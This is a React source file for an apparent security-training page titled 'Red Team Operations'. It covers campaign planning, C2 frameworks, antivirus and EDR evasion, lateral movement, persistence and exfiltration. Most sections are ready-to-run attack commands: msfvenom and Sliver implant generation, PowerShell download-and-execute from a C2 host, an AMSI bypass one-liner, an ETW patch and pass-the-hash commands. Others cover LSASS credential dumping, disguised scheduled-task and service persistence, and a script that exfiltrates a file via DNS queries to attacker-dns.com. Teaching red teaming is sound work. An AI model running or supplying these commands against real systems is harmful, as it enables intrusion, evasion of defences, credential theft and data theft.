'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#ff3333'
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#6a3a3a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080202', border: `1px solid #3a0000`, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#3a0000', marginRight: '8px' }}>//</span>{children}
  </h2>
)
const P = ({ children }: { children: React.ReactNode }) => <p style={{ color: '#9a8a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>

export default function RedTeam() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#6a3a3a' }}>
        <Link href="/" style={{ color: '#6a3a3a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span><span style={{ color: accent }}>RED TEAM OPERATIONS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: `rgba(255,51,51,0.08)`, border: `1px solid rgba(255,51,51,0.3)`, borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/red-team/lab" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #1a1010', borderRadius: '3px', color: '#6a3a3a', fontSize: '8px' }}>LAB →</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#6a3a3a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: `0 0 20px rgba(255,51,51,0.35)` }}>RED TEAM OPERATIONS</h1>
        <p style={{ color: '#6a3a3a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>Full campaign methodology · C2 frameworks · Cobalt Strike · Sliver · AV evasion · Living off the land · Persistence · Exfiltration</p>
      </div>

      <H2>01 — Red Team vs Pentest vs Bug Bounty</H2>
      <Pre label="// UNDERSTANDING THE SPECTRUM">{`# Bug Bounty:
# → Find individual vulnerabilities in specific scope
# → Rewarded per valid finding
# → No physical, no social engineering, no persistence
# → Report immediately, no full exploitation

# Penetration Test:
# → Time-boxed (1-4 weeks typically)
# → Defined scope and rules of engagement
# → Goal: find as many vulnerabilities as possible
# → Demonstrate impact but stop before data exfil
# → Deliver comprehensive report

# Red Team Engagement:
# → Simulate real APT (Advanced Persistent Threat)
# → Objective-based: "Get to crown jewel data"
# → Full spectrum: technical + social + physical
# → Stealth is paramount — avoid detection
# → May last months
# → Only a small team knows (excluding blue team)
# → Tests detection AND prevention

# Purple Team:
# → Red and blue team work together
# → Red attacks → blue watches → improve detection
# → Collaborative, not adversarial`}</Pre>

      <H2>02 — Campaign Planning</H2>
      <Pre label="// PLANNING A RED TEAM ENGAGEMENT">{`# Phase 1: Scoping & Rules of Engagement
# - What is the crown jewel? (Domain admin? Customer data? IP?)
# - What's in scope? (All systems? Specific networks?)
# - What's out of scope? (Production databases? Healthcare systems?)
# - Allowed TTPs? (Social engineering? Physical?)
# - Emergency contacts if something breaks
# - Get written authorisation BEFORE doing anything

# Phase 2: Reconnaissance (OSINT)
# - Employee names, emails, roles (LinkedIn)
# - Technologies used (job postings, Shodan, BuiltWith)
# - Email format (hunter.io)
# - Exposed credentials (HaveIBeenPwned, Dehashed)
# - Domain infrastructure (Amass, subfinder)
# - Physical locations (Google Maps, Glassdoor)

# Phase 3: Initial Access
# - Spear phishing (most common entry)
# - Exposed services (VPN, RDP, OWA)
# - Supply chain (attack a vendor first)
# - Physical (USB drop, tailgating)
# - Watering hole (compromise site employees visit)

# Phase 4: Establish Foothold
# - Deploy C2 implant (Cobalt Strike, Sliver, Havoc)
# - Establish persistent C2 callback
# - Blend into normal network traffic

# Phase 5: Internal Recon & Lateral Movement
# → See section 5 below

# Phase 6: Achieve Objective
# - Move to crown jewel
# - Screenshot/document evidence
# - Exfil sample data (agreed with client)

# Phase 7: Reporting
# - Executive summary (non-technical)
# - Technical findings with reproduction steps
# - Attack timeline
# - Detection gaps
# - Remediation roadmap`}</Pre>

      <H2>03 — C2 Frameworks</H2>
      <Pre label="// COMMAND & CONTROL INFRASTRUCTURE">{`# What is C2?
# Implant on victim machine phones home to your server
# You send commands → implant executes → results returned
# All over encrypted channel (HTTPS typically)
# Blends in as legitimate web traffic

# COBALT STRIKE (industry standard, paid ~$3500/yr)
# Concepts:
# - Beacon: implant that runs on victim
# - Listener: your server waiting for callbacks
# - Teamserver: C2 server all operators connect to
# - Malleable C2: customize beacon traffic profile

# Beacon types:
# HTTP/HTTPS Beacon: callbacks over web traffic
# DNS Beacon: commands encoded in DNS queries (ultra stealthy)
# SMB Beacon: peer-to-peer via named pipes (no internet needed)

# Free alternatives:
# SLIVER (by BishopFox) — best free C2
git clone https://github.com/BishopFox/sliver
# Generate implant:
generate --http YOUR_C2_DOMAIN --os windows --arch amd64 --save implant.exe
# Start listener:
https --domain YOUR_C2_DOMAIN

# HAVOC (newer, open source)
git clone https://github.com/HavocFramework/Havoc

# COVENANT (.NET C2)
git clone https://github.com/cobbr/Covenant

# Metasploit (basic but widely known):
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST YOUR_IP
set LPORT 443
run`}</Pre>

      <H2>04 — AV & EDR Evasion</H2>
      <Pre label="// BYPASS ANTIVIRUS AND ENDPOINT DETECTION">{`# Why signatures fail:
# AV works by matching known bad patterns (signatures)
# Change the pattern → bypass signature detection
# Modern EDR uses behaviour detection (harder to bypass)

# TECHNIQUE 1: Obfuscation
# XOR encode shellcode:
python3 -c "
import sys
shellcode = b'\\x90\\x90...'  # your shellcode
key = 0x41
encoded = bytes([b ^ key for b in shellcode])
print(encoded.hex())
"
# Decode at runtime → AV never sees original shellcode

# TECHNIQUE 2: Process Injection
# Inject into legitimate process (explorer.exe, svchost.exe)
# Shellcode runs under trusted process name
# VirtualAllocEx → WriteProcessMemory → CreateRemoteThread

# TECHNIQUE 3: Fileless / In-Memory
# Never write to disk → no file for AV to scan
# PowerShell: IEX(New-Object Net.WebClient).downloadString('http://C2/payload')
# Everything runs in memory

# TECHNIQUE 4: Living off the Land (LOLBins)
# Use signed Windows binaries to execute code:
# certutil -decode encoded.b64 payload.exe    (download & decode)
# mshta http://C2/payload.hta                 (execute HTA)
# regsvr32 /u /s /i:http://C2/payload.sct scrobj.dll
# rundll32 javascript:"\..\mshtml,RunHTMLApplication ";...

# TECHNIQUE 5: AMSI Bypass (PowerShell scanning)
# AMSI scans PowerShell scripts before execution
# Patch amsiInitFailed in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# TECHNIQUE 6: ETW (Event Tracing) Patch
# ETW provides visibility to EDR — patch it:
$patch = [byte[]](0xc3)  # RET instruction
$ntdll = [Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {$_.ModuleName -eq "ntdll.dll"}
# Patch EtwEventWrite → blind the EDR

# Tools:
# Scarecrow — payload wrapper with evasion
# Donut — shellcode generator from .NET
# Msfvenom with encoders (basic but start here)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 \
  -f exe -e x64/xor_dynamic -i 5 -o payload.exe`}</Pre>

      <H2>05 — Internal Recon & Lateral Movement</H2>
      <Pre label="// MOVE THROUGH THE NETWORK LIKE AN APT">{`# Internal recon (from compromised host):
# Network discovery:
for /L %i in (1,1,254) do ping -n 1 -w 50 192.168.1.%i | find "TTL"

# PowerShell network scan:
1..254 | ForEach-Object { 
  $ip = "192.168.1.$_"
  if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip }
}

# Enumerate domain (with PowerView):
IEX(New-Object Net.WebClient).downloadString('http://C2/PowerView.ps1')
Get-DomainUser -Properties SamAccountName,Description,LastLogonDate
Get-DomainComputer | select Name,OperatingSystem
Find-LocalAdminAccess  # Where are you local admin?
Get-DomainGroupMember "Domain Admins"

# Pass the Hash lateral movement:
# With CrackMapExec:
cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth -x "whoami"

# PSExec-style:
python3 psexec.py -hashes :NTLM_HASH domain/admin@TARGET

# WMI (stealthier):
python3 wmiexec.py -hashes :NTLM_HASH domain/admin@TARGET

# Token impersonation (if SeImpersonatePrivilege):
# PrintSpoofer, RoguePotato, JuicyPotato
PrintSpoofer.exe -i -c cmd  # From low-priv service account → SYSTEM

# Lateral movement via RDP:
xfreerdp /u:admin /pth:NTLM_HASH /v:TARGET_IP  # RDP with hash`}</Pre>

      <H2>06 — Persistence Mechanisms</H2>
      <Pre label="// MAINTAIN ACCESS ACROSS REBOOTS">{`# Registry Run Keys:
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
  /v WindowsUpdate /t REG_SZ /d "C:\\Windows\\Temp\\beacon.exe"

# Scheduled Task (looks legitimate):
schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate\\Automatic" \
  /tr "C:\\Windows\\Temp\\beacon.exe" /sc onlogon /ru SYSTEM /f

# Service creation:
sc create WindowsDefenderUpdate \
  binpath= "C:\\Windows\\Temp\\beacon.exe" \
  start= auto
sc start WindowsDefenderUpdate

# WMI Subscription (fileless, advanced):
# Runs command when specific event occurs (e.g. every login)
$filter = Set-WmiInstance -Namespace root\subscription \
  -Class __EventFilter -Arguments @{
    Name="WUFilter"
    EventNamespace="root\cimv2"
    QueryLanguage="WQL"
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  }

# DLL Hijacking:
# Find applications that load DLLs from writable paths
# Drop malicious DLL with same name
# Application loads your DLL → code execution on startup

# LSASS dump for offline cracking:
# Task Manager → lsass.exe → Create Dump File
# Or with mimikatz: sekurlsa::logonpasswords
# Or: procdump.exe -ma lsass.exe lsass.dmp → transfer → analyse offline`}</Pre>

      <H2>07 — Exfiltration Techniques</H2>
      <Pre label="// GET DATA OUT WITHOUT TRIGGERING ALERTS">{`# Blend into normal traffic:
# HTTPS to a cloud service (Teams, Dropbox, OneDrive)
# Most orgs whitelist these → data leaves undetected

# DNS exfiltration (bypasses most egress filters):
# Encode data as subdomain → query DNS
# Your DNS server → decodes the queries → reassembles data
python3 -c "
import base64, os
data = open('secret.txt','rb').read()
encoded = base64.b32encode(data).decode()
# Split into 63-char chunks (DNS subdomain limit)
chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
for i, chunk in enumerate(chunks):
    os.system(f'nslookup {chunk}.{i}.attacker-dns.com')
"

# ICMP exfiltration (ping tunnel):
# Tools: ptunnel, icmptunnel
# Data encoded in ICMP echo payload
# Looks like ping traffic

# HTTP headers exfiltration:
# Encode data in Cookie, Referer, User-Agent headers
# Blends into normal web traffic

# Size matters — exfil slowly:
# Large sudden transfers trigger DLP alerts
# Spread over days/weeks to stay under threshold
# Match typical business hours patterns

# Steganography exfil:
# Hide data in images posted to social media
# steghide embed -cf image.jpg -sf secret.txt
# Image uploaded normally → your server downloads → extract`}</Pre>

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: `1px solid #3a0000`, display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a3a3a' }}>← DASHBOARD</Link>
        <Link href="/modules/red-team/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: `1px solid rgba(255,51,51,0.4)`, borderRadius: '4px', background: `rgba(255,51,51,0.06)` }}>PROCEED TO LAB →</Link>
      </div>
    </div>
  )
}
